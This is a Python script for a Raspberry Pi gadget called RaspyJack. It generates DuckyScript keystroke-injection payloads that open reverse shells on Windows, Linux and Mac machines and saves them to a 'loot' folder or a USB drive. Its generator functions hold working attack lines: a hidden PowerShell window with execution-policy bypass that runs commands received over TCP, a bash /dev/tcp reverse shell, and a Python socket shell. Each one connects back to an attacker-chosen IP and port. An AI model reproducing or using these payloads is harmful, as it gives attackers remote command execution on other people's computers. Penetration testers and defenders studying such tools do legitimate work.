#!/usr/bin/env python3
"""
RaspyJack Payload -- Reverse Shell DuckyScript Generator
---------------------------------------------------------
Author: 7h30th3r0n3

Generate DuckyScript payloads that establish reverse shells on targets.
Select target OS, shell type, callback IP/port via on-device menus.
Saves generated scripts to /root/Raspyjack/loot/DuckyPayloads/.

Controls:
  UP/DOWN  = navigate menus / scroll preview
  LEFT/RIGHT = change character in IP/port picker
  OK       = select option / confirm
  KEY1     = generate script
  KEY2     = copy to USB (if mounted)
  KEY3     = exit / back
"""

import os
import sys
import time
import signal
import subprocess
import shutil

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

DEBOUNCE = 0.25
ROW_H = 12
LOOT_DIR = "/root/Raspyjack/loot/DuckyPayloads"
USB_MOUNT_PATHS = ["/media/usb", "/mnt/usb", "/media/pi"]

TARGET_OS_LIST = ["Windows", "Linux", "Mac"]
SHELL_TYPES = {
    "Windows": ["PowerShell"],
    "Linux": ["Bash"],
    "Mac": ["Python"],
}

IP_CHARS = "0123456789."
PORT_CHARS = "0123456789"

running = True


def _signal_handler(*_):
    global running
    running = False


signal.signal(signal.SIGINT, _signal_handler)
signal.signal(signal.SIGTERM, _signal_handler)


# -------------------------------------------------------------------
# Network helpers
# -------------------------------------------------------------------

def _get_local_ip():
    """Get the first non-loopback IP address."""
    for iface in ["eth0", "wlan0", "tailscale0"]:
        try:
            res = subprocess.run(
                ["ip", "-4", "addr", "show", "dev", iface],
                capture_output=True, text=True, timeout=5,
            )
            for line in res.stdout.splitlines():
                stripped = line.strip()
                if stripped.startswith("inet "):
                    return stripped.split()[1].split("/")[0]
        except Exception:
            continue
    return "10.0.0.1"


def _find_usb_mount():
    """Find a mounted USB drive path."""
    for path in USB_MOUNT_PATHS:
        if os.path.ismount(path):
            return path
    # Check /media for any mounted device
    try:
        media = "/media"
        if os.path.isdir(media):
            for name in os.listdir(media):
                full = os.path.join(media, name)
                if os.path.ismount(full):
                    return full
    except OSError:
        pass
    return None


# -------------------------------------------------------------------
# DuckyScript templates
# -------------------------------------------------------------------

def _gen_windows_powershell(ip, port):
    """Generate DuckyScript for Windows PowerShell reverse shell."""
    # PowerShell reverse shell using encoded command
    ps_cmd = (
        f"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
        f"$s=$c.GetStream();"
        f"[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length))-ne 0)"
        f"{{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
        f"$o=(iex $d 2>&1|Out-String);"
        f"$r=$o+'PS '+(pwd).Path+'> ';"
        f"$sb=([text.encoding]::ASCII).GetBytes($r);"
        f"$s.Write($sb,0,$sb.Length);$s.Flush()}};"
        f"$c.Close()"
    )

    lines = [
        "REM Reverse Shell - Windows PowerShell",
        f"REM Target: {ip}:{port}",
        "REM Author: 7h30th3r0n3",
        "DELAY 1000",
        "GUI r",
        "DELAY 500",
        "STRING powershell -w hidden -nop -ep bypass",
        "ENTER",
        "DELAY 1000",
        f"STRING {ps_cmd}",
        "ENTER",
    ]
    return "\n".join(lines)


def _gen_linux_bash(ip, port):
    """Generate DuckyScript for Linux Bash reverse shell."""
    lines = [
        "REM Reverse Shell - Linux Bash",
        f"REM Target: {ip}:{port}",
        "REM Author: 7h30th3r0n3",
        "DELAY 1000",
        "CTRL ALT t",
        "DELAY 800",
        f"STRING bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "ENTER",
    ]
    return "\n".join(lines)


def _gen_mac_python(ip, port):
    """Generate DuckyScript for Mac Python reverse shell."""
    py_cmd = (
        f"python3 -c 'import socket,subprocess,os;"
        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        f"s.connect((\"{ip}\",{port}));"
        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
        f"os.dup2(s.fileno(),2);"
        f"subprocess.call([\"/bin/sh\",\"-i\"])'"
    )

    lines = [
        "REM Reverse Shell - Mac Python",
        f"REM Target: {ip}:{port}",
        "REM Author: 7h30th3r0n3",
        "DELAY 1000",
        "GUI SPACE",
        "DELAY 500",
        "STRING Terminal",
        "DELAY 500",
        "ENTER",
        "DELAY 1000",
        f"STRING {py_cmd}",
        "ENTER",
    ]
    return "\n".join(lines)


GENERATORS = {
    ("Windows", "PowerShell"): _gen_windows_powershell,
    ("Linux", "Bash"): _gen_linux_bash,
    ("Mac", "Python"): _gen_mac_python,
}


# -------------------------------------------------------------------
# Display functions
# -------------------------------------------------------------------

def _draw_header(d, title, right_text="K3"):
    """Draw header bar."""
    d.rectangle((0, 0, 127, 13), fill="#2b1a0e")
    d.text((2, 1), title, font=font, fill="#ff8c00")
    d.text((108, 1), right_text, font=font, fill="white")


def _draw_footer(d, text):
    """Draw footer bar."""
    d.rectangle((0, 116, 127, 127), fill="#2b1a0e")
    d.text((2, 117), text, font=font, fill="#666666")


def _draw_menu(title, options, cursor, info_lines=None):
    """Draw a selection menu."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    _draw_header(d, title)

    y = 18
    if info_lines:
        for info in info_lines:
            d.text((2, y), info[:20], font=font, fill="#888888")
            y += ROW_H
        y += 2

    for idx, opt in enumerate(options):
        is_sel = idx == cursor
        prefix = ">" if is_sel else " "
        color = "#ff8c00" if is_sel else "#aaaaaa"
        bg = "#332200" if is_sel else "black"
        d.rectangle((0, y, 127, y + ROW_H - 1), fill=bg)
        d.text((2, y), f"{prefix} {opt}", font=font, fill=color)
        y += ROW_H

    _draw_footer(d, "OK=select KEY3=back")
    LCD.LCD_ShowImage(img, 0, 0)


def _draw_char_picker(label, value, char_pos, char_set):
    """Draw the character picker for IP/port input."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    _draw_header(d, label)

    # Current value display
    d.text((2, 20), "Current:", font=font, fill="#888888")

    # Show the value with cursor highlight
    x_start = 2
    y_val = 34
    for idx, ch in enumerate(value):
        color = "#ff8c00" if idx == char_pos else "#cccccc"
        bg = "#443300" if idx == char_pos else "black"
        char_w = 7
        d.rectangle((x_start, y_val, x_start + char_w, y_val + ROW_H), fill=bg)
        d.text((x_start, y_val), ch, font=font, fill=color)
        x_start += char_w

    # Cursor indicator
    cursor_x = 2 + char_pos * 7
    d.text((cursor_x, y_val + ROW_H + 2), "^", font=font, fill="#ff8c00")

    # Current character info
    if char_pos < len(value):
        current_char = value[char_pos]
        ci = char_set.index(current_char) if current_char in char_set else 0
        d.text((2, 62), f"Char: '{current_char}' ({ci + 1}/{len(char_set)})", font=font, fill="#aaaaaa")

    # Instructions
    d.text((2, 78), "U/D = change char", font=font, fill="#666666")
    d.text((2, 90), "L/R = move cursor", font=font, fill="#666666")
    d.text((2, 102), "OK  = add position", font=font, fill="#666666")

    _draw_footer(d, "KEY1=done KEY3=del")
    LCD.LCD_ShowImage(img, 0, 0)


def _draw_preview(script_lines, scroll, filename):
    """Draw scrollable script preview."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    _draw_header(d, "Preview")

    visible = 8
    y = 16
    end = min(len(script_lines), scroll + visible)
    for idx in range(scroll, end):
        line = script_lines[idx][:20]
        d.text((2, y), line, font=font, fill="#cccccc")
        y += ROW_H

    if len(script_lines) > visible:
        pos = f"{scroll + 1}/{max(1, len(script_lines) - visible + 1)}"
        d.text((85, 16), pos, font=font, fill="#666666")

    _draw_footer(d, "K2=USB KEY3=back")
    LCD.LCD_ShowImage(img, 0, 0)


def _draw_message(title, lines, color="#00ff88"):
    """Draw a simple message screen."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    _draw_header(d, title)

    y = 30
    for line in lines:
        d.text((2, y), line[:20], font=font, fill=color)
        y += ROW_H

    _draw_footer(d, "KEY3=back")
    LCD.LCD_ShowImage(img, 0, 0)


# -------------------------------------------------------------------
# Character picker logic
# -------------------------------------------------------------------

def _run_char_picker(label, initial, char_set):
    """Run the character picker UI. Returns the entered string."""
    value = list(initial)
    char_pos = 0
    last_press = 0.0

    while running:
        # Ensure value has at least one position
        if not value:
            value = [char_set[0]]

        if char_pos >= len(value):
            char_pos = len(value) - 1
        if char_pos < 0:
            char_pos = 0

        _draw_char_picker(label, "".join(value), char_pos, char_set)

        btn = get_button(PINS, GPIO)
        now = time.time()
        if btn and (now - last_press) < DEBOUNCE:
            btn = None
        if btn:
            last_press = now

        if btn == "KEY3":
            # Delete character at cursor
            if len(value) > 1:
                new_value = list(value)
                del new_value[char_pos]
                value = new_value
                if char_pos >= len(value):
                    char_pos = len(value) - 1

        elif btn == "KEY1":
            # Done
            return "".join(value)

        elif btn == "LEFT":
            if char_pos > 0:
                char_pos -= 1

        elif btn == "RIGHT":
            if char_pos < len(value) - 1:
                char_pos += 1

        elif btn == "OK":
            # Add new character after cursor
            new_value = list(value)
            new_value.insert(char_pos + 1, char_set[0])
            value = new_value
            char_pos += 1

        elif btn == "UP":
            if char_pos < len(value):
                current = value[char_pos]
                ci = char_set.index(current) if current in char_set else 0
                ci = (ci + 1) % len(char_set)
                new_value = list(value)
                new_value[char_pos] = char_set[ci]
                value = new_value

        elif btn == "DOWN":
            if char_pos < len(value):
                current = value[char_pos]
                ci = char_set.index(current) if current in char_set else 0
                ci = (ci - 1) % len(char_set)
                new_value = list(value)
                new_value[char_pos] = char_set[ci]
                value = new_value

        time.sleep(0.08)

    return "".join(value)


# -------------------------------------------------------------------
# Script generation and saving
# -------------------------------------------------------------------

def _generate_script(target_os, shell_type, ip, port):
    """Generate DuckyScript for the given parameters."""
    gen_func = GENERATORS.get((target_os, shell_type))
    if gen_func is None:
        return f"REM Unsupported: {target_os}/{shell_type}"
    return gen_func(ip, int(port))


def _save_script(script, target_os, shell_type):
    """Save generated script to loot directory. Returns filepath."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = time.strftime("%Y%m%d_%H%M%S")
    filename = f"ducky_{target_os}_{shell_type}_{ts}.txt"
    filepath = os.path.join(LOOT_DIR, filename)
    with open(filepath, "w") as fh:
        fh.write(script)
    return filepath


def _copy_to_usb(filepath):
    """Copy script to mounted USB drive. Returns (success, message)."""
    usb_path = _find_usb_mount()
    if not usb_path:
        return False, "No USB mounted"

    filename = os.path.basename(filepath)
    dest = os.path.join(usb_path, filename)
    try:
        shutil.copy2(filepath, dest)
        return True, f"Copied to {usb_path}"
    except OSError as exc:
        return False, f"Copy failed: {str(exc)[:30]}"


# -------------------------------------------------------------------
# Main
# -------------------------------------------------------------------

def main():
    """Main entry point."""
    default_ip = _get_local_ip()
    default_port = "4444"

    # State
    mode = "os_select"  # os_select | shell_select | ip_input | port_input | preview | message
    os_cursor = 0
    shell_cursor = 0
    selected_os = TARGET_OS_LIST[0]
    selected_shell = SHELL_TYPES[TARGET_OS_LIST[0]][0]
    callback_ip = default_ip
    callback_port = default_port
    generated_script = ""
    saved_filepath = ""
    preview_scroll = 0
    preview_lines = []
    msg_lines = []
    msg_color = "#00ff88"
    last_press = 0.0

    try:
        while running:
            btn = get_button(PINS, GPIO)
            now = time.time()

            if btn and (now - last_press) < DEBOUNCE:
                btn = None
            if btn:
                last_press = now

            # --- OS selection ---
            if mode == "os_select":
                _draw_menu(
                    "Target OS",
                    TARGET_OS_LIST,
                    os_cursor,
                    [f"IP: {callback_ip}", f"Port: {callback_port}"],
                )

                if btn == "KEY3":
                    break
                elif btn == "UP":
                    os_cursor = max(0, os_cursor - 1)
                elif btn == "DOWN":
                    os_cursor = min(len(TARGET_OS_LIST) - 1, os_cursor + 1)
                elif btn == "OK":
                    selected_os = TARGET_OS_LIST[os_cursor]
                    shell_cursor = 0
                    mode = "shell_select"
                elif btn == "LEFT":
                    mode = "ip_input"
                elif btn == "RIGHT":
                    mode = "port_input"
                elif btn == "KEY1":
                    # Quick generate with current settings
                    selected_os = TARGET_OS_LIST[os_cursor]
                    selected_shell = SHELL_TYPES[selected_os][0]
                    generated_script = _generate_script(
                        selected_os, selected_shell, callback_ip, callback_port,
                    )
                    try:
                        saved_filepath = _save_script(generated_script, selected_os, selected_shell)
                        preview_lines = generated_script.splitlines()
                        preview_scroll = 0
                        mode = "preview"
                    except OSError as exc:
                        msg_lines = ["Save failed:", str(exc)[:18]]
                        msg_color = "#ff4444"
                        mode = "message"

            # --- Shell type selection ---
            elif mode == "shell_select":
                available = SHELL_TYPES.get(selected_os, [])
                _draw_menu(
                    f"{selected_os} Shell",
                    available,
                    shell_cursor,
                )

                if btn == "KEY3":
                    mode = "os_select"
                elif btn == "UP":
                    shell_cursor = max(0, shell_cursor - 1)
                elif btn == "DOWN":
                    shell_cursor = min(len(available) - 1, shell_cursor + 1)
                elif btn == "OK" or btn == "KEY1":
                    selected_shell = available[shell_cursor]
                    generated_script = _generate_script(
                        selected_os, selected_shell, callback_ip, callback_port,
                    )
                    try:
                        saved_filepath = _save_script(generated_script, selected_os, selected_shell)
                        preview_lines = generated_script.splitlines()
                        preview_scroll = 0
                        mode = "preview"
                    except OSError as exc:
                        msg_lines = ["Save failed:", str(exc)[:18]]
                        msg_color = "#ff4444"
                        mode = "message"

            # --- IP input ---
            elif mode == "ip_input":
                callback_ip = _run_char_picker("Callback IP", callback_ip, IP_CHARS)
                mode = "os_select"

            # --- Port input ---
            elif mode == "port_input":
                callback_port = _run_char_picker("Callback Port", callback_port, PORT_CHARS)
                # Validate port range
                try:
                    port_val = int(callback_port)
                    if port_val < 1 or port_val > 65535:
                        callback_port = "4444"
                except ValueError:
                    callback_port = "4444"
                mode = "os_select"

            # --- Preview ---
            elif mode == "preview":
                _draw_preview(preview_lines, preview_scroll, os.path.basename(saved_filepath))

                if btn == "KEY3":
                    mode = "os_select"
                elif btn == "UP":
                    preview_scroll = max(0, preview_scroll - 1)
                elif btn == "DOWN":
                    max_s = max(0, len(preview_lines) - 8)
                    preview_scroll = min(max_s, preview_scroll + 1)
                elif btn == "KEY2":
                    if saved_filepath:
                        ok, usb_msg = _copy_to_usb(saved_filepath)
                        msg_lines = [usb_msg]
                        msg_color = "#00ff88" if ok else "#ff4444"
                        mode = "message"

            # --- Message ---
            elif mode == "message":
                _draw_message("Info", msg_lines, msg_color)
                if btn == "KEY3":
                    mode = "os_select"

            time.sleep(0.08)

    finally:
        LCD.LCD_Clear()
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
